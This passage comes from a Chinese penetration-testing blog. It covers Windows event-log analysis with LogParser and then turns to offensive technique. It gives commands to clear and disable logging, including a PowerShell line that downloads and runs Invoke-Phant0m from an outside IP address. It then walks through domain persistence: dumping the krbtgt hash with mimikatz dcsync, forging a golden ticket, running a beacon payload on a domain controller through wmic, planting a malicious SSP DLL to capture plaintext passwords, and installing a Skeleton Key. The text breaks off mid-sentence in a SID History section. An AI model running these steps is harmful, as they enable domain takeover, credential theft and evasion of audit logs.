class="hljs n1ql">LogParser.exe -i:EVT –o:DATAGRID &quot;<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> c:\baopo.evtx <span class="hljs-keyword">where</span> EventID=<span class="hljs-number">4624</span><span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218210636848.png" alt="image-20240218210636848"></p><p>如图可以看到查询的信息有如下字段：  </p><blockquote><p>EventLog：事件日志，文件路径<br>RecordNumber：记录编号<br>TimeGenerated：生成时间<br>TimeWritten：写入时间<br>EventID：事件ID<br>EventType：事件类型<br>EventTypeName：事件类型名称<br>EventCategory：事件类别<br>EventCategoryName：事件类别名称<br>SourceName：来源名称<br>Strings：字符<br>ComputerName：计算机名<br>SID：安全标识符<br>Message：消息<br>Data：数据  </p></blockquote><p>指定时间范围登录成功的事件：（TimeGenerated）  </p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">LogParser.exe -i:EVT -o:DATAGRID &quot;<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> c:\baopo.evtx <span class="hljs-keyword">where</span> TimeGenerated &lt; <span class="hljs-string">&#x27;2022-09-30 11:25:00&#x27;</span> <span class="hljs-keyword">and</span> TimeGenerated &gt; <span class="hljs-string">&#x27;2022-09-30 11:23:00&#x27;</span> <span class="hljs-keyword">and</span> eventid=<span class="hljs-number">4624</span><span class="hljs-string">&quot;</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>指定时间范围登录成功的事件：（TimeGenerated）  </p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">LogParser.exe -i:EVT -o:DATAGRID &quot;<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> c:\baopo.evtx <span class="hljs-keyword">where</span> TimeGenerated &lt; <span class="hljs-string">&#x27;2022-09-30 11:25:00&#x27;</span> <span class="hljs-keyword">and</span> TimeGenerated &gt; <span class="hljs-string">&#x27;2022-09-30 11:23:00&#x27;</span> <span class="hljs-keyword">and</span> eventid=<span class="hljs-number">4624</span><span class="hljs-string">&quot;</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218211301965.png" alt="image-20240218211301965"></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">LogParser.exe -i:EVT –o:DATAGRID &quot;<span class="hljs-keyword">SELECT</span> EXTRACT_TOKEN(Strings,<span class="hljs-number">5</span>,<span class="hljs-string">&#x27;|&#x27;</span>) <span class="hljs-keyword">as</span> UserName, TimeGenerated <span class="hljs-keyword">as</span> LoginTime, EXTRACT_TOKEN(Message,<span class="hljs-number">13</span>,<span class="hljs-string">&#x27; &#x27;</span>) <span class="hljs-keyword">as</span> LogonType, EXTRACT_TOKEN(Message,<span class="hljs-number">38</span>,<span class="hljs-string">&#x27; &#x27;</span>) <span class="hljs-keyword">as</span> LoginIP <span class="hljs-keyword">FROM</span> c:\baopo.evtx <span class="hljs-keyword">where</span> EventID=<span class="hljs-number">4624</span><span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218211356319.png" alt="image-20240218211356319"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">EXTRACT_TOKEN</span>(Strings,<span class="hljs-number">5</span>,&#x27;|&#x27;) as UserName ：获取用户名<br><br><span class="hljs-attribute">Strings</span>的值为：<br><span class="hljs-attribute">S</span>-<span class="hljs-number">1</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>|-|-|<span class="hljs-number">0</span>x0|S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">2599880275</span>-<span class="hljs-number">3611086684</span>-<span class="hljs-number">3620703807</span>-<span class="hljs-number">500</span>|Administrator|PC|<span class="hljs-number">0</span>x78a856|<span class="hljs-number">3</span>|NtLmSsp |NTLM|\\<span class="hljs-number">192.168.81.134</span>|&#123;<span class="hljs-number">00000000</span>-<span class="hljs-number">0000</span>-<span class="hljs-number">0000</span>-<span class="hljs-number">0000</span>-<span class="hljs-number">000000000000</span>&#125;|-|NTLM V1|<span class="hljs-number">0</span>|<span class="hljs-number">0</span>x0|-|<span class="hljs-number">192.168.81.134</span>|<span class="hljs-number">53472</span><br><br><span class="hljs-attribute">EXTRACT_TOKEN</span>作用：用 | 分割 Strings 的值，从<span class="hljs-number">0</span>开始取到<span class="hljs-number">5</span>，为第<span class="hljs-number">6</span>个结果，即用户名<br><br><span class="hljs-attribute">EXTRACT_TOKEN</span>(Strings,<span class="hljs-number">18</span>,&#x27;|&#x27;) as LoginIP ：获取IP地址<br></code></pre></td></tr></table></figure><p>查询登录失败的事件  </p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">LogParser.exe -i:EVT –o:DATAGRID &quot;<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> c:\baopo.evtx <span class="hljs-keyword">where</span> EventID=<span class="hljs-number">4625</span><span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p>指定时间范围登录失败的事件：  </p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">LogParser.exe -i:EVT -o:DATAGRID &quot;<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> c:\baopo.evtx <span class="hljs-keyword">where</span> TimeGenerated &lt; <span class="hljs-string">&#x27;2022-09-30 11:24:36&#x27;</span> <span class="hljs-keyword">and</span> TimeGenerated &gt; <span class="hljs-string">&#x27;2022-09-30 11:24:00&#x27;</span> <span class="hljs-keyword">and</span> eventid=<span class="hljs-number">4625</span><span class="hljs-string">&quot;</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>提取登录失败用户名进行聚合统计：  </p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">LogParser.exe -i:EVT -o:DATAGRID &quot;<span class="hljs-keyword">SELECT</span> EXTRACT_TOKEN(Message,<span class="hljs-number">19</span>,<span class="hljs-string">&#x27; &#x27;</span>) <span class="hljs-keyword">as</span> LoginName, EXTRACT_TOKEN(Message,<span class="hljs-number">13</span>,<span class="hljs-string">&#x27; &#x27;</span>) <span class="hljs-keyword">as</span> LogonType, <span class="hljs-built_in">count</span>(EXTRACT_TOKEN(Message,<span class="hljs-number">19</span>,<span class="hljs-string">&#x27; &#x27;</span>)) <span class="hljs-keyword">as</span> Times, EXTRACT_TOKEN(Message,<span class="hljs-number">38</span>,<span class="hljs-string">&#x27; &#x27;</span>) <span class="hljs-keyword">as</span> LoginIP <span class="hljs-keyword">FROM</span> c:\baopo.evtx <span class="hljs-keyword">where</span> EventID=<span class="hljs-number">4625</span> <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> Message<span class="hljs-string">&quot;</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>系统历史开关机记录</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">LogParser.exe -i:EVT –o:DATAGRID &quot;<span class="hljs-keyword">SELECT</span> TimeGenerated,EventID,Message <span class="hljs-keyword">FROM</span> c:\<span class="hljs-keyword">System</span>.evtx <span class="hljs-keyword">where</span> EventID=<span class="hljs-number">6005</span> <span class="hljs-keyword">or</span> EventID=<span class="hljs-number">6006</span><span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><h2 id="Event-Log-Explorer"><a href="#Event-Log-Explorer" class="headerlink" title="Event Log Explorer"></a>Event Log Explorer</h2><p>Event Log Explorer 是一款非常好用的Windows日志分析工具。可用于查看，监视和分析跟事件记录，包括安全，系 统，应用程序和其他微软 Windows 的记录  被记载的事件，其强大的过滤功能可以快速的过滤出有价值的信息。  </p><p>下载地址：<a href="https://event-log-explorer.en.softonic.com/">https://event-log-explorer.en.softonic.com</a></p><h1 id="痕迹清楚"><a href="#痕迹清楚" class="headerlink" title="痕迹清楚"></a>痕迹清楚</h1><h2 id="Windows日志清理"><a href="#Windows日志清理" class="headerlink" title="Windows日志清理"></a>Windows日志清理</h2><p>wevtutil.exe：用于检索有关事件日志和发布者的信息，安装和卸载事件清单，运行查询以及导出、存档和清除日志。  </p><blockquote><p># 统计日志列表，查询所有日志信息，包含时间，数目</p><p>wevtutil.exe gli Application</p><p># 获取security的最近十条日志</p><p>wevtutil qe Security &#x2F;f:text &#x2F;rd:true &#x2F;c:10</p><p># 获得Security的前十条Security日志</p><p>wevtutil qe Security &#x2F;f:text &#x2F;c:10<br>wevtutil qe Security &#x2F;f:xml &#x2F;c:10<br>wevtutil qe Security &#x2F;rd:true &#x2F;c:10</p><p># 导出指定日志保存</p><p>wevtutil.exe epl Security 1.evtx</p><p># 查看指定类别的日志内容</p><p>wevtutil qe Application &#x2F;f:text</p><p># 删除该类日志所有内容</p><p>wevtutil cl security<br>wevtutil cl system<br>wevtutil cl application<br>wevtutil cl “windows powershell”</p></blockquote><p>主要就是删除日志</p><h2 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h2><ol><li><p>删除所有在渗透过程中使用的工具  </p></li><li><p>删除之前添加的账号</p></li></ol>   <figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">username</span> /del<br></code></pre></td></tr></table></figure><ol start="3"><li>删除应用程序、系统和安全模块日志</li></ol>   <figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">clearev</span><br></code></pre></td></tr></table></figure><ol start="4"><li>关闭所有的Meterpreter连接</li></ol>   <figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sessions</span><br><span class="hljs-attribute">sessions -K</span><br></code></pre></td></tr></table></figure><p>   -K 删除所有的</p><p>   -k 删除指定的</p><ol start="5"><li>查看事件日志</li></ol>   <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">run</span> event_manager -i<br></code></pre></td></tr></table></figure><ol start="6"><li>删除事件日志</li></ol>   <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">run</span> event_manager -c<br></code></pre></td></tr></table></figure><h2 id="停止日志记录"><a href="#停止日志记录" class="headerlink" title="停止日志记录"></a>停止日志记录</h2><p>利用脚本让日志功能失效，无法记录日志。  </p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-string">&quot;IEX(new-object system.net.webclient).downloadstring(&#x27;http://47.101.214.85:8000/Invoke-Phant0m.ps1&#x27;);Invoke-Phant0m&quot;</span><br></code></pre></td></tr></table></figure><blockquote><p><a href="https://github.com/hlldz/Invoke-Phant0m">https://github.com/hlldz/Invoke-Phant0m</a>  </p></blockquote><p>一个 cs 插件</p><p>用于停止日志记录</p><p>手动的话</p><p>把eventlog对应的svchost进程结束  </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218215813916.png" alt="image-20240218215813916"></p><p>重新开启Windows  Event Log服务，即可恢复日志记录</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> <span class="hljs-built_in">start</span> eventlog<br></code></pre></td></tr></table></figure><h2 id="cs-插件"><a href="#cs-插件" class="headerlink" title="cs 插件"></a>cs 插件</h2><blockquote><p><a href="https://github.com/QAX-A-Team/EventLogMaster">QAX-A-Team&#x2F;EventLogMaster: Cobalt Strike插件 - RDP日志取证&amp;清除 (github.com)</a></p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>域环境权限维持</title>
    <link href="/2024/02/17/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
    <url>/2024/02/17/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</url>
    
    <content type="html"><![CDATA[<h1 id="PTT"><a href="#PTT" class="headerlink" title="PTT"></a>PTT</h1><blockquote><p>  PASS The Ticket  </p></blockquote><h1 id="黄金票据伪造"><a href="#黄金票据伪造" class="headerlink" title="黄金票据伪造"></a>黄金票据伪造</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>这个过程发生在 AS确认Client端登录者用户身份 中</p><p>当KDC 返回Meg B 其中包含了使用KRBTGT  NTLM HASH (TGS) 加密的TGT， 如果此时我们获取了KGBTGT  的NTML HASH的话我们就可以解密这个TGT 从而伪造伪造一个新的 TGT 然后发给KGBTGT，此时KGBTGT 同样的使用自己的HASH 进行解密，就可以获取到我们伪造的[CLIENT&#x2F;TGS SESSIONKEY] 成功解密并完成 TGT 的数据进行对比。这就已经骗过了KDC 获取服务权限</p><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><ol><li><p>域名称 </p></li><li><p>域的SID值  </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240217102719998.png" alt="image-20240217102719998"></p><p>前面部分为sid 后面为rid 可以使用rid 劫取</p></li><li><p>域的 KRBTGT 账户密码 HASH  </p></li><li><p>伪造用户名，可以是任意的</p></li></ol><h2 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h2><ol><li><p>域名称</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240217103016801.png" alt="image-20240217103016801"></p><p>也可以通过whoami 获取当前的域名称</p></li><li><p>获取sid</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">whoami /<span class="hljs-keyword">user</span><br><span class="hljs-title">wmic</span> useraccount list brief<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240217103228371.png" alt="image-20240217103228371"></p><p>同时可以发现这个域名</p><p>注意，我们只需要前面的部分、</p><p>如果没有发现这个hash值的话，可以尝试使用进程注入的方式进行提权，从而获取hash</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240217111534452.png" alt="image-20240217111534452"></p><p>可以选择system 权限的进程进行迁移</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240217111643452.png" alt="image-20240217111643452"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240217111726746.png" alt="image-20240217111726746"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240217111912814.png" alt="image-20240217111912814"></p></li><li><p>域 krbtgt 账户 ntlm  hash 或aes-256值  </p><blockquote><p>mimikatz lsadump::dcsync &#x2F;user:krbtgt(username)@august.local  </p><p>mimikatz lsadump::dcsync &#x2F;domain:august.local &#x2F;all &#x2F;csv</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240217103924909.png" alt="image-20240217103924909"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240217112455764.png" alt="image-20240217112455764"></p><p>这个会自带注入</p></li><li><p>清理所有的票据</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">klist purge<br>mimikatz kerberos::purge<br></code></pre></td></tr></table></figure><p>我们也可以查看所有缓存的票据</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">klist<br>mimikatz kerberos::list<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240217104140723.png" alt="image-20240217104140723"></p><p>没有票据</p></li><li><p>mimikatz伪造指定用户的票据并注入内存  </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mimikatz</span> kerberos::golden /user:administrator /domain:august.local /sid:S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">1007551803</span>-<span class="hljs-number">2786613087</span>-<span class="hljs-number">1256062893</span> /krbtgt:a5025dd54ecce3ce2b31e1a07098c093 /endin:<span class="hljs-number">480</span> /renewmax:<span class="hljs-number">10080</span> /ptt<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">/admin：伪造的用户名<br>/domain：域名称<br>/sid：SID值，注意是去掉最后一个-后面的值<br>/krbtgt：krbtgt的HASH值<br>/ticket：生成的票据名称<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240217104916144.png" alt="image-20240217104916144"></p><p>发现注入成功</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240217104955464.png" alt="image-20240217104955464"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240217112613161.png" alt="image-20240217112613161"></p><p>如果这个显示的是  拒绝访问</p><p>可以尝试使用</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="language-bash"> <span class="hljs-built_in">dir</span> \\DC\c$</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240217112747334.png" alt="image-20240217112747334"></p></li><li><p>得到域控主机的权限</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim">upload /root/beacon.<span class="hljs-keyword">exe</span> (C:\Users\de1ay.DE1AY\Desktop\beacon.<span class="hljs-keyword">exe</span>)<br><span class="hljs-keyword">shell</span> <span class="hljs-keyword">copy</span> C:\artifact_x64.<span class="hljs-keyword">exe</span> \\<span class="hljs-number">10.10</span>.<span class="hljs-number">10.128</span>\<span class="hljs-keyword">c</span>$<br><span class="hljs-keyword">shell</span> wmic /authority:<span class="hljs-string">&quot;kerberos:august.com\DC&quot;</span> /node:<span class="hljs-string">&quot;DC&quot;</span> process <span class="hljs-keyword">call</span> create <span class="hljs-string">&quot;cmd /c c:\artifact_x64.exe&quot;</span><br>connect <span class="hljs-number">10.10</span>.<span class="hljs-number">10.10</span><br></code></pre></td></tr></table></figure><p>现在模拟再做一遍横向移动</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240217113439520.png" alt="image-20240217113439520"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240217113542049.png" alt="image-20240217113542049"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240217113654586.png" alt="image-20240217113654586"></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">shell wmic /<span class="hljs-keyword">node</span><span class="hljs-title">:10</span>.<span class="hljs-number">10.10</span>.<span class="hljs-number">128</span>  process call create <span class="hljs-string">&quot;c:\artifact_x64.exe&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240217134203046.png" alt="image-20240217134203046"></p></li><li><p>保存票据为文件  </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mimikatz</span> kerberos::golden /user:administrator /domain:august.com /sid:S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">1007551803</span>-<span class="hljs-number">2786613087</span>-<span class="hljs-number">1256062893</span> /krbtgt:a5025dd54ecce3ce2b31e1a07098c093 /ticket:golden.kirbi<br></code></pre></td></tr></table></figure><p>  通过mimikatz中的kerberos::ptt功能（Pass The Ticket）将golden.kiribi导入内存中</p></li></ol><h1 id="SSP"><a href="#SSP" class="headerlink" title="SSP"></a>SSP</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>SSP：security Support Provider,一个用于身份验证的 dll</p><p>SSPI：Security  Support Provider Interface，Windows 系统在执行认证操作所使用的API。  SSPI是SSP的API接口  </p><p>LSA：Local  Security Authority，用于身份认证，常见进程为 lsass.exe，特别的地方在于  LSA是可扩展的，在系统启动的时SSP会被加载到进程lsass.exe中.这相当于我们可以自定义一个  </p><p>dll，在系统启动的时候被加载到进程 lsass.exe 。</p></blockquote><p>但是高版本中这个进程里不会存在明文密码了，只有hash 值</p><p>可以通过修改注册表从而实现保存，所以我们就可以启用保存秘密的操作，然后就可以直接读取到明文密码了</p><blockquote><p><a href="https://www.anquanke.com/post/id/255226">浅谈无需修改注册表抓取明文密码-安全客 - 安全资讯平台 (anquanke.com)</a></p></blockquote><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>由于ssp 可以可扩展，我们就可以加载一个恶意的dll 文件。</p><p>作为攻击者可以直接使用一个可以抓取明文密码的dll 文件</p><p>就比如mimikatz 的mimilib.dll 文件</p><blockquote><p>将 mimikatz 中的 mimilib.dll 放到系统的C:\Windows\system32目录下（DLL的位数需要与  windows位数相同），并将 mimilib.dll 添加到注册表中，使用此方法即使系统重启，也不会影响  到持久化的效果。  </p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240217141542379.png" alt="image-20240217141542379"></p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="dll-注入"><a href="#dll-注入" class="headerlink" title="dll 注入"></a>dll 注入</h3><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs swift">copy mimilib.dll <span class="hljs-operator">%</span>systemroot<span class="hljs-operator">%</span>\system32<br>reg query hklm\system\currentcontrolset\control\lsa\ <span class="hljs-operator">/</span>v <span class="hljs-string">&quot;Security Packages&quot;</span><br>reg add <span class="hljs-string">&quot;hklm\system\currentcontrolset\control\lsa&quot;</span> <span class="hljs-operator">/</span>v <span class="hljs-string">&quot;Security Packages&quot;</span> <span class="hljs-operator">/</span>d <span class="hljs-string">&quot;kerberos<span class="hljs-subst">\0</span>msv1_0<span class="hljs-subst">\0</span>schannel<span class="hljs-subst">\0</span>wdigest<span class="hljs-subst">\0</span>tspkg<span class="hljs-subst">\0</span>pku2u<span class="hljs-subst">\0</span>mimilib&quot;</span> <span class="hljs-operator">/</span>t <span class="hljs-type">REG_MULTI_SZ</span><br></code></pre></td></tr></table></figure><p>注意应该在powershell 中执行</p><p>在获取主机的情况之下</p><p>获取当前的路径</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240217142128502.png" alt="image-20240217142128502"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240217142328756.png" alt="image-20240217142328756"></p><p>然后执行命令</p><p>然后只有等用户重启之后，如果有用户登录系统，才会有记载</p><blockquote><p>  会在 c:\windows\system32 目录下生成一个用于  记录登账账号密码的 kiwissp.log 文件  </p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240217144000593.png" alt="image-20240217144000593"></p><p>但是域控不会轻易的重启</p><h3 id="mimikatz-直接注入到内存"><a href="#mimikatz-直接注入到内存" class="headerlink" title="mimikatz 直接注入到内存"></a>mimikatz 直接注入到内存</h3><blockquote><p>  Memory Updating of SSPs  </p></blockquote><p>这个会更加实用一些</p><blockquote><p>使用mimikatz将伪造的SSP注入内存，这样做不会在系统中留下二进制文件，但如果域控制器重  启，被注入内存的伪造的SS将会丢失。  </p></blockquote><p>但是域控不会轻易的重启</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lasso">mimikatz privilege<span class="hljs-type">::debug</span><br>mimikatz misc<span class="hljs-type">::memssp</span><br><span class="hljs-keyword">type</span> C:\Windows\System32\mimilsa.<span class="hljs-keyword">log</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240217144645101.png" alt="image-20240217144645101"></p><p>注入成功</p><p>尝试登录</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240217144753328.png" alt="image-20240217144753328"></p><h1 id="Skeleton-Key"><a href="#Skeleton-Key" class="headerlink" title="Skeleton Key"></a>Skeleton Key</h1><p>可以生成一个万能的密码用于登录</p><p>哪一个主机安装这个key 对哪一个主机是万能密码</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Skeleton</span> <span class="hljs-built_in">Key</span>是一种不需要域控重启即能生效的维持域控权限方法。<br><span class="hljs-built_in">Skeleton</span> <span class="hljs-built_in">Key</span>被安装在<span class="hljs-number">64</span>位的域控服务器上<span class="hljs-operator">,</span>支持 <span class="hljs-variable">Windows</span> <span class="hljs-variable">Server2003</span>—<span class="hljs-variable">Windows</span> <span class="hljs-variable">Server2012R2</span> <span class="hljs-operator">,</span>能够让所有域用户使用同一个万能密码进行登录，现有的所有域用户使用原密码仍能继续登录，注意并不能更改用户权限，重启后失效。<br></code></pre></td></tr></table></figure><h2 id="尝试域控安装万能密码"><a href="#尝试域控安装万能密码" class="headerlink" title="尝试域控安装万能密码"></a>尝试域控安装万能密码</h2><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">privilege::debug<br>misc::skeleton<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240217145508683.png" alt="image-20240217145508683"></p><blockquote><p>  mimikatz的默认Skeleton Key设置为mimikatz，Skeleton Key只是给所有账户添加了一个万能密  码，无法修改账户的权限  </p></blockquote><p>也就是说任何用户都可以使用万能密码登录</p><p>验证</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> \\DC.august.<span class="hljs-keyword">local</span> mimikatz /user:administrator@august.<span class="hljs-keyword">local</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240217145716267.png" alt="image-20240217145716267"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240217145905530.png" alt="image-20240217145905530"></p><p>注意应该是dc.august.local 其他的容易出错</p><p>而且不是所有的域控都是dc 只不过这这里我们将dc 主机的主机名设置成了dc</p><h1 id="SID-History"><a href="#SID-History" class="headerlink" title="SID History"></a>SID History</h1><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><blockquote><p>每个用户都有自己的SID。SID的作用主要是跟踪安全主体控制用户连接资源时的访问权限。  SID History是在域迁移过程中需要使用的一个属性。  </p><p>如果将A域中的域用户迁移到B域中，那么在B域中该用户的SID会随之改变，进而影响迁移后用户的权  限，导致迁移后的用户不能访问本来可以访问的资源。  </p><p>SID History的作用是在域迁移过程中保持域用户的访问权限，即如果迁移后用户的SID改变了，系统会  将其原来的SID添加到迁移后用户的SID History属性中，使迁移后的用户保持原有权限、能够访问其原  来可以访问的资源。  </p><p>使用mimikatz，可以将SID History属性添加到域中任意用户的SID History属性中。在实战中，如果获  